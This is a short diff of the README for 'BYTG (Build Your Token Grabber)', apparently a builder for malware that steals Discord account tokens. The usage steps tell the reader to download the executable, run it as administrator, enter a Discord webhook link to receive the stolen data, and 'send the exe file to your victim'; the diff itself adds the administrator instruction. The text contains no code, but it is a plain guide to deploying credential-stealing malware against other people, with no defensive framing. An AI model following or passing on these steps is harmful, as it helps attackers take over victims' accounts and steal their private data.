@@ -16,7 +16,7 @@ BYTG (Build Your Token Grabber)
 
 ## 💻 Usage
 * Download the exe verions from the last [realese](https://github.com/CaptainBeluga/BYTG/releases/).
-* Execute it.
+* Execute it as ADMINISTRATOR :warning:
 * Input your discord webhook link.
 * Send the exe file to your victim.
 
